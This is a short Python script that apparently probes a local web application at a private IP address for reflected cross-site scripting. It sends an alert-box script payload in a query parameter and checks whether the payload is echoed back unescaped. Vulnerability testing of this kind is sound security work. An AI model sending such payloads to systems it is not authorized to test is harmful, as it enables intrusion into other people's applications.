import requests

# The target URL to test for XSS vulnerability
TARGET_URL = "http://192.168.2.69:3000"

# Test payload that might cause XSS if the input is not properly sanitized
PAYLOAD = "'><script>alert('XSS')</script>"

# Send request with the payload in the query parameters
response = requests.get(TARGET_URL, params={'input': PAYLOAD})

# Define the success signal we are looking for - this should match something specific to your application's output
SUCCESS_SIGNAL = "<script>alert('XSS')</script>"

# Check if the response contains the success signal
if SUCCESS_SIGNAL in response.text:
    print("RESULT: SUCCESS\nEvidence:\n", response.text)
else:
    print("RESULT: NO_SIGNAL")